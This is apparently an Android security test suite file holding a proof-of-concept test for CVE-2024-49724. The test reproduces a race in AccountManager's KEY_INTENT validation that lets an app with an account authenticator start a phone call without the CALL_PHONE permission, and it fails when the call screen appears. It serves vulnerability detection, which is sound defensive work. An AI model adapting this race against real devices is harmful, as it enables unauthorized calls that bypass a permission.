/*
 * Copyright (C) 2025 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.CVE_2024_49724;

import static androidx.test.platform.app.InstrumentationRegistry.getInstrumentation;

import static com.android.sts.common.DumpsysUtils.isActivityVisible;
import static com.android.sts.common.SystemUtil.poll;

import static com.google.common.truth.Truth.assertWithMessage;
import static com.google.common.truth.TruthJUnit.assume;

import android.accounts.ChooseTypeAndAccountActivity;
import android.app.Instrumentation;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;

import androidx.test.runner.AndroidJUnit4;
import androidx.test.uiautomator.By;
import androidx.test.uiautomator.BySelector;
import androidx.test.uiautomator.UiDevice;
import androidx.test.uiautomator.UiObject2;
import androidx.test.uiautomator.Until;

import org.junit.Test;
import org.junit.runner.RunWith;

import java.util.HashSet;
import java.util.regex.Pattern;

@RunWith(AndroidJUnit4.class)
public class DeviceTest {

    @Test
    public void testPocCVE_2024_49724() {
        try {
            // A race condition exists in modifying the mimeGroup definition between the validation
            // of KEY_INTENT in AccountManagerService#checkKeyIntent() and its use in
            // AccountManager$Response#OnResult(). Attempt to reproduce the vulnerability 5 times,
            // increasing the delay before modifying the mimeGroup with each iteration.
            for (int idx = 0; idx < 5; ++idx) {
                // Set PocPlaceHolderActivity as preferred activity
                final Instrumentation instrumentation = getInstrumentation();
                final Context context = instrumentation.getContext();
                context.getPackageManager()
                        .setMimeGroup("cve_2024_49724_mimeGroup", new HashSet<>());
                context.startActivity(
                        new Intent(Intent.ACTION_CALL)
                                .setData(Uri.parse(context.getString(R.string.dataUri)))
                                .setFlags(
                                        Intent.FLAG_ACTIVITY_NEW_TASK
                                                | Intent.FLAG_ACTIVITY_CLEAR_TASK));
                final UiDevice uiDevice = UiDevice.getInstance(instrumentation);
                String pocPlaceHolderActivity = context.getString(R.string.pocPlaceHolderActivity);
                assume().withMessage(
                                String.format(
                                        "UI object corresponding to label %s not found",
                                        pocPlaceHolderActivity))
                        .that(
                                findUiObject(
                                        uiDevice,
                                        By.text(
                                                Pattern.compile(
                                                        pocPlaceHolderActivity,
                                                        Pattern.CASE_INSENSITIVE)),
                                        true /* clickRequired */))
                        .isTrue();
                assume().withMessage("UI object corresponding to ALWAYS button not found")
                        .that(
                                findUiObject(
                                        uiDevice,
                                        By.res(
                                                Pattern.compile(
                                                        "android:id/button_always",
                                                        Pattern.CASE_INSENSITIVE)),
                                        true /* clickRequired */))
                        .isTrue();

                // Launch 'ChooseTypeAndAccountActivity'
                context.startActivity(
                        new Intent()
                                .setClassName(
                                        "android", ChooseTypeAndAccountActivity.class.getName())
                                .putExtra(
                                        ChooseTypeAndAccountActivity
                                                .EXTRA_ALLOWABLE_ACCOUNT_TYPES_STRING_ARRAY,
                                        new String[] {context.getString(R.string.accountAuthType)})
                                .setFlags(
                                        Intent.FLAG_ACTIVITY_NEW_TASK
                                                | Intent.FLAG_ACTIVITY_CLEAR_TASK));

                // Fail the test if InCallActivity is launched
                assertWithMessage(
                                "The device is vulnerable to b/369351375, an application with"
                                        + " account authenticator can bypass"
                                        + " android.permission.CALL_PHONE permission ")
                        .that(poll(() -> isActivityVisible("InCallActivity")))
                        .isFalse();
            }
        } catch (Exception e) {
            assume().that(e).isNull();
        }
    }

    private boolean findUiObject(UiDevice uiDevice, BySelector selector, boolean clickRequired)
            throws Exception {
        final UiObject2 uiobject = uiDevice.wait(Until.findObject(selector), 5000 /* timeout */);
        if (clickRequired && (uiobject != null)) {
            poll(() -> (uiobject.isEnabled()));
            uiobject.click();
        }
        return (uiobject != null);
    }
}
